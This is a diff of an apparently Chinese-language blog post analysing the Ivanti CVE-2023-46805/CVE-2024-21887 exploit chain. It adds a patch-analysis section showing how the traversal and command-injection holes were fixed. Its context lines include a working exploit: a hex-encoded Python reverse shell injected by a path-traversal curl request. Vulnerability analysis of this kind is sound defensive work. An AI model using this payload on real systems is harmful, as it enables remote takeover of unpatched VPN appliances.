@@ -273,6 +273,47 @@ Content-Length: 46
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;;python -c &amp;#39;import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;#34;host\&amp;#34;,48989));subprocess.call([\&amp;#34;/bin/sh\&amp;#34;,\&amp;#34;-i\&amp;#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&amp;#39;;&amp;#34;&lt;/span&gt; | xxd -p&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -ik --path-as-is https://host/api/v1/totp/user-backup-code/../../license/keys-status/$payload
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;补丁分析&#34;&gt;补丁分析&lt;/h4&gt;
+&lt;p&gt;安装补丁后，按照老办法将磁盘密钥拖出来，而后解密磁盘，得到修复后的代码。s&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;目录穿越&lt;/strong&gt;
+查看diff可知
+
+&lt;img alt=&#34;&#34; src=&#34;https://www.ch35tnut.com/images/vulnerability/CVE-2023-46805_CVE-2024-21887-ivanti-rce.zh-cn.assets/2.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;在&lt;code&gt;PyRestHandler:WebHandler&lt;/code&gt;函数中对目录穿越漏洞进行了修复，在web服务器将请求转发给restservice之前，先验证了url中是否有&lt;code&gt;../&lt;/code&gt;及各种变形，验证通过后才将请求转发给后端的restservice。&lt;/p&gt;
+&lt;p&gt;
+&lt;img alt=&#34;&#34; src=&#34;https://www.ch35tnut.com/images/vulnerability/CVE-2023-46805_CVE-2024-21887-ivanti-rce.zh-cn.assets/3.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;命令执行&lt;/strong&gt;
+从补丁中可以看到其将Popen的stdout改为了subprocess.PIPE，从而将命令执行修复。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(self, url_suffix&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, node_name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/api/v1/license/keys-status&amp;#34;&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                dsinstall &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;environ&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DSINSTALL&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; node_name &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    node_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                   &lt;span style=&#34;color:#f92672&#34;&gt;....&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                proc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Popen(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        dsinstall &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/perl5/bin/perl&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        dsinstall &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/perl/getLicenseCapacity.pl&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;getLicenseKeys&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        node_name,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    ],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    stdout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PIPE,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                )
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;同样的在awsazuretestconnection.py中也对命令注入进行了修复&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    args &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        dsinstall &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/perl5/bin/perl&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        dsinstall &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/perl/AwsAzureTestConnection.pl&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        method,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    ]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;extend([str(x) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; server_information])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    proc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Popen(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        args,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        shell&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        stdout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PIPE,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    output, errors &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;communicate()
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;小结&#34;&gt;小结&lt;/h3&gt;
 &lt;p&gt;这个漏洞利用链利用了二进制文件中路径判断问题，使用目录穿越绕过权限验证访问后端接口，同时通过Popen的命令注入注入恶意命令并执行，构成了完整的利用链，由于没办法获取到补丁，所以暂时没办法分析ivanti怎么修复的该漏洞。&lt;/p&gt;
 &lt;p&gt;利用截图&lt;/p&gt;
